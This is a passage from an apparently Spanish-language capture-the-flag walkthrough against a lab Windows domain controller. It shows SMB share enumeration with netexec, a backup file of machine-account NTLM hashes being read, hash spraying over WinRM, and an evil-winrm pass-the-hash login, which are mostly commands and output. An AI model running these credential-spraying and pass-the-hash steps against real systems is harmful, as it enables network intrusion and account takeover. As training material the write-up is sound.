</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC01</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[+]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="ss">file_svc</span><span class="p">:</span><span class="no">Password123</span><span class="o">!!</span> 
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Started</span> <span class="k">module</span> <span class="nn">spidering_plus</span> <span class="n">with</span> <span class="n">the</span> <span class="n">following</span> <span class="ss">options</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span>  <span class="ss">DOWNLOAD_FLAG</span><span class="p">:</span> <span class="no">True</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span>     <span class="ss">STATS_FLAG</span><span class="p">:</span> <span class="no">True</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="ss">EXCLUDE_FILTER</span><span class="p">:</span> <span class="o">[</span><span class="s1">&#39;print$&#39;</span><span class="p">,</span> <span class="s1">&#39;ipc$&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span>   <span class="ss">EXCLUDE_EXTS</span><span class="p">:</span> <span class="o">[</span><span class="s1">&#39;ico&#39;</span><span class="p">,</span> <span class="s1">&#39;lnk&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span>  <span class="ss">MAX_FILE_SIZE</span><span class="p">:</span> <span class="mi">50</span> <span class="no">KB</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span>  <span class="ss">OUTPUT_FOLDER</span><span class="p">:</span> <span class="sr">/home/</span><span class="n">kali</span><span class="o">/.</span><span class="n">nxc</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">nxc_spider_plus</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Enumerated</span> <span class="n">shares</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">Share</span>           <span class="no">Permissions</span>     <span class="no">Remark</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">ADMIN</span><span class="err">$</span>                          <span class="no">Remote</span> <span class="no">Admin</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="n">backup</span>          <span class="no">READ</span>            
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="n">C</span><span class="err">$</span>                              <span class="no">Default</span> <span class="n">share</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">IPC</span><span class="err">$</span>            <span class="no">READ</span>            <span class="no">Remote</span> <span class="no">IPC</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">NETLOGON</span>        <span class="no">READ</span>            <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">SYSVOL</span>          <span class="no">READ</span>            <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="no">Users</span>                           
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[+]</span> <span class="no">Saved</span> <span class="n">share</span><span class="o">-</span><span class="n">file</span> <span class="n">metadata</span> <span class="n">to</span> <span class="s2">&#34;/home/kali/.nxc/modules/nxc_spider_plus/10.201.61.197.json&#34;</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">SMB</span> <span class="ss">Shares</span><span class="p">:</span>           <span class="mi">7</span> <span class="p">(</span><span class="no">ADMIN</span><span class="vg">$,</span> <span class="n">backup</span><span class="p">,</span> <span class="n">C</span><span class="vg">$,</span> <span class="no">IPC</span><span class="vg">$,</span> <span class="no">NETLOGON</span><span class="p">,</span> <span class="no">SYSVOL</span><span class="p">,</span> <span class="no">Users</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">SMB</span> <span class="no">Readable</span> <span class="ss">Shares</span><span class="p">:</span>  <span class="mi">4</span> <span class="p">(</span><span class="n">backup</span><span class="p">,</span> <span class="no">IPC</span><span class="vg">$,</span> <span class="no">NETLOGON</span><span class="p">,</span> <span class="no">SYSVOL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">SMB</span> <span class="no">Filtered</span> <span class="ss">Shares</span><span class="p">:</span>  <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Total</span> <span class="n">folders</span> <span class="ss">found</span><span class="p">:</span>  <span class="mi">17</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Total</span> <span class="n">files</span> <span class="ss">found</span><span class="p">:</span>    <span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">File</span> <span class="n">size</span> <span class="ss">average</span><span class="p">:</span>    <span class="mi">1</span><span class="o">.</span><span class="mi">13</span> <span class="no">KB</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">File</span> <span class="n">size</span> <span class="ss">min</span><span class="p">:</span>        <span class="mi">22</span> <span class="n">B</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">File</span> <span class="n">size</span> <span class="ss">max</span><span class="p">:</span>        <span class="mi">3</span><span class="o">.</span><span class="mi">68</span> <span class="no">KB</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">File</span> <span class="n">unique</span> <span class="ss">exts</span><span class="p">:</span>     <span class="mi">3</span> <span class="p">(</span><span class="n">ini</span><span class="p">,</span> <span class="n">txt</span><span class="p">,</span> <span class="n">inf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Downloads</span> <span class="ss">successful</span><span class="p">:</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="no">SPIDER_PLUS</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="o">[+]</span> <span class="no">All</span> <span class="n">files</span> <span class="n">processed</span> <span class="n">successfully</span><span class="o">.</span></span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">tree</span> <span class="o">-</span><span class="n">a</span>             
</span></span><span class="line"><span class="cl"><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="err">├──</span> <span class="n">backup</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span>   <span class="err">└──</span> <span class="n">backup_extract</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="err">└──</span> <span class="no">SYSVOL</span>
</span></span><span class="line"><span class="cl">    <span class="err">└──</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span>
</span></span><span class="line"><span class="cl">        <span class="err">└──</span> <span class="no">Policies</span>
</span></span><span class="line"><span class="cl">            <span class="err">├──</span> <span class="p">{</span><span class="mi">31</span><span class="no">B2F340</span><span class="o">-</span><span class="mo">016</span><span class="n">D</span><span class="o">-</span><span class="mi">11</span><span class="no">D2</span><span class="o">-</span><span class="mi">945</span><span class="n">F</span><span class="o">-</span><span class="mo">00</span><span class="no">C04FB984F9</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="err">│</span>   <span class="err">├──</span> <span class="no">GPT</span><span class="o">.</span><span class="n">INI</span>
</span></span><span class="line"><span class="cl">            <span class="err">│</span>   <span class="err">└──</span> <span class="no">MACHINE</span>
</span></span><span class="line"><span class="cl">            <span class="err">│</span>       <span class="err">└──</span> <span class="no">Microsoft</span>
</span></span><span class="line"><span class="cl">            <span class="err">│</span>           <span class="err">└──</span> <span class="no">Windows</span> <span class="no">NT</span>
</span></span><span class="line"><span class="cl">            <span class="err">│</span>               <span class="err">└──</span> <span class="no">SecEdit</span>
</span></span><span class="line"><span class="cl">            <span class="err">│</span>                   <span class="err">└──</span> <span class="no">GptTmpl</span><span class="o">.</span><span class="n">inf</span>
</span></span><span class="line"><span class="cl">            <span class="err">└──</span> <span class="p">{</span><span class="mi">6</span><span class="no">AC1786C</span><span class="o">-</span><span class="mo">016</span><span class="n">F</span><span class="o">-</span><span class="mi">11</span><span class="no">D2</span><span class="o">-</span><span class="mi">945</span><span class="n">F</span><span class="o">-</span><span class="mo">00</span><span class="no">C04fB984F9</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="err">├──</span> <span class="no">GPT</span><span class="o">.</span><span class="n">INI</span>
</span></span><span class="line"><span class="cl">                <span class="err">└──</span> <span class="no">MACHINE</span>
</span></span><span class="line"><span class="cl">                    <span class="err">└──</span> <span class="no">Microsoft</span>
</span></span><span class="line"><span class="cl">                        <span class="err">└──</span> <span class="no">Windows</span> <span class="no">NT</span>
</span></span><span class="line"><span class="cl">                            <span class="err">└──</span> <span class="no">SecEdit</span>
</span></span><span class="line"><span class="cl">                                <span class="err">└──</span> <span class="no">GptTmpl</span><span class="o">.</span><span class="n">inf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">15</span> <span class="n">directories</span><span class="p">,</span> <span class="mi">5</span> <span class="n">files</span></span></span></code></pre></div>
<p>Leemos el .txt:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="n">backup</span><span class="o">/</span><span class="n">backup_extract</span><span class="o">.</span><span class="n">txt</span> 
</span></span><span class="line"><span class="cl"><span class="no">WebServer</span><span class="vg">$:</span><span class="mi">2119</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">DatabaseServer</span><span class="vg">$:</span><span class="mi">2120</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">406</span><span class="n">b424c7b483a42458bf6f545c936f7</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">CitrixServer</span><span class="vg">$:</span><span class="mi">2122</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">48</span><span class="n">fc7eca9af236d7849273990f6c5117</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">FileServer</span><span class="vg">$:</span><span class="mi">2065</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">MailServer</span><span class="vg">$:</span><span class="mi">2124</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">46</span><span class="n">a4655f18def136b3bfab7b0b4e70e3</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">BackupServer</span><span class="vg">$:</span><span class="mi">2125</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">46</span><span class="n">a4655f18def136b3bfab7b0b4e70e3</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">ApplicationServer</span><span class="vg">$:</span><span class="mi">2126</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">8</span><span class="n">cd90ac6cba6dde9d8038b068c17e9f5</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">PrintServer</span><span class="vg">$:</span><span class="mi">2127</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">ProxyServer</span><span class="vg">$:</span><span class="mi">2128</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">4e3</span><span class="n">f0bb3e5b6e3e662611b1a87988881</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">MonitoringServer</span><span class="vg">$:</span><span class="mi">2129</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">48</span><span class="n">fc7eca9af236d7849273990f6c5117</span><span class="o">::</span><span class="p">:</span></span></span></code></pre></div>
<p>Separamos el username y el NT_HASH para probar si tenemos acceso con winrm:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">winrm</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span> <span class="o">-</span><span class="n">u</span> <span class="n">backups</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">H</span> <span class="n">backups_nthash</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">continue</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">success</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">bruteforce</span>
</span></span><span class="line"><span class="cl"><span class="no">WINRM</span>       <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">5985</span>   <span class="no">DC01</span>             <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC01</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="sr">/usr/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">spnego</span><span class="o">/</span><span class="n">_ntlm_raw</span><span class="o">/</span><span class="n">crypto</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span> <span class="ss">CryptographyDeprecationWarning</span><span class="p">:</span> <span class="no">ARC4</span> <span class="n">has</span> <span class="n">been</span> <span class="n">moved</span> <span class="n">to</span> <span class="n">cryptography</span><span class="o">.</span><span class="n">hazmat</span><span class="o">.</span><span class="n">decrepit</span><span class="o">.</span><span class="n">ciphers</span><span class="o">.</span><span class="n">algorithms</span><span class="o">.</span><span class="n">ARC4</span> <span class="ow">and</span> <span class="n">will</span> <span class="n">be</span> <span class="n">removed</span> <span class="n">from</span> <span class="n">this</span> <span class="k">module</span> <span class="nn">in</span> <span class="mi">48</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">  <span class="n">arc4</span> <span class="o">=</span> <span class="n">algorithms</span><span class="o">.</span><span class="n">ARC4</span><span class="p">(</span><span class="nb">self</span><span class="o">.</span><span class="n">_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">WINRM</span>       <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">5985</span>   <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="no">WebServer</span><span class="vg">$:</span><span class="n">c47b45f5d4df5a494bd19f13e14f7902</span>
</span></span><span class="line"><span class="cl"><span class="sr">/usr/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">spnego</span><span class="o">/</span><span class="n">_ntlm_raw</span><span class="o">/</span><span class="n">crypto</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span> <span class="ss">CryptographyDeprecationWarning</span><span class="p">:</span> <span class="no">ARC4</span> <span class="n">has</span> <span class="n">been</span> <span class="n">moved</span> <span class="n">to</span> <span class="n">cryptography</span><span class="o">.</span><span class="n">hazmat</span><span class="o">.</span><span class="n">decrepit</span><span class="o">.</span><span class="n">ciphers</span><span class="o">.</span><span class="n">algorithms</span><span class="o">.</span><span class="n">ARC4</span> <span class="ow">and</span> <span class="n">will</span> <span class="n">be</span> <span class="n">removed</span> <span class="n">from</span> <span class="n">this</span> <span class="k">module</span> <span class="nn">in</span> <span class="mi">48</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">  <span class="n">arc4</span> <span class="o">=</span> <span class="n">algorithms</span><span class="o">.</span><span class="n">ARC4</span><span class="p">(</span><span class="nb">self</span><span class="o">.</span><span class="n">_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">WINRM</span>       <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">5985</span>   <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="no">DatabaseServer</span><span class="vg">$:</span><span class="mi">406</span><span class="n">b424c7b483a42458bf6f545c936f7</span>
</span></span><span class="line"><span class="cl"><span class="sr">/usr/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">spnego</span><span class="o">/</span><span class="n">_ntlm_raw</span><span class="o">/</span><span class="n">crypto</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span> <span class="ss">CryptographyDeprecationWarning</span><span class="p">:</span> <span class="no">ARC4</span> <span class="n">has</span> <span class="n">been</span> <span class="n">moved</span> <span class="n">to</span> <span class="n">cryptography</span><span class="o">.</span><span class="n">hazmat</span><span class="o">.</span><span class="n">decrepit</span><span class="o">.</span><span class="n">ciphers</span><span class="o">.</span><span class="n">algorithms</span><span class="o">.</span><span class="n">ARC4</span> <span class="ow">and</span> <span class="n">will</span> <span class="n">be</span> <span class="n">removed</span> <span class="n">from</span> <span class="n">this</span> <span class="k">module</span> <span class="nn">in</span> <span class="mi">48</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">  <span class="n">arc4</span> <span class="o">=</span> <span class="n">algorithms</span><span class="o">.</span><span class="n">ARC4</span><span class="p">(</span><span class="nb">self</span><span class="o">.</span><span class="n">_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">WINRM</span>       <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">5985</span>   <span class="no">DC01</span>             <span class="o">[-]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="no">CitrixServer</span><span class="vg">$:</span><span class="mi">48</span><span class="n">fc7eca9af236d7849273990f6c5117</span>
</span></span><span class="line"><span class="cl"><span class="sr">/usr/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">spnego</span><span class="o">/</span><span class="n">_ntlm_raw</span><span class="o">/</span><span class="n">crypto</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span> <span class="ss">CryptographyDeprecationWarning</span><span class="p">:</span> <span class="no">ARC4</span> <span class="n">has</span> <span class="n">been</span> <span class="n">moved</span> <span class="n">to</span> <span class="n">cryptography</span><span class="o">.</span><span class="n">hazmat</span><span class="o">.</span><span class="n">decrepit</span><span class="o">.</span><span class="n">ciphers</span><span class="o">.</span><span class="n">algorithms</span><span class="o">.</span><span class="n">ARC4</span> <span class="ow">and</span> <span class="n">will</span> <span class="n">be</span> <span class="n">removed</span> <span class="n">from</span> <span class="n">this</span> <span class="k">module</span> <span class="nn">in</span> <span class="mi">48</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">  <span class="n">arc4</span> <span class="o">=</span> <span class="n">algorithms</span><span class="o">.</span><span class="n">ARC4</span><span class="p">(</span><span class="nb">self</span><span class="o">.</span><span class="n">_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">WINRM</span>       <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span>   <span class="mi">5985</span>   <span class="no">DC01</span>             <span class="o">[+]</span> <span class="no">SOUPEDECODE</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">\</span><span class="no">FileServer</span><span class="vg">$:</span><span class="n">e41da7e79a4c76dbd9cf79d1cb325559</span> <span class="p">(</span><span class="no">Pwn3d</span><span class="o">!</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">....</span></span></span></code></pre></div>
<h1 id="movimiento-lateral">
  Movimiento Lateral
  <a class="heading-link" href="#movimiento-lateral">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;FileServer$&#39;</span> <span class="o">-</span><span class="n">H</span> <span class="n">e41da7e79a4c76dbd9cf79d1cb325559</span>
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl"><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="o">.</span><span class="mi">7</span>
</span></span><span class="line"><span class="cl">                                        
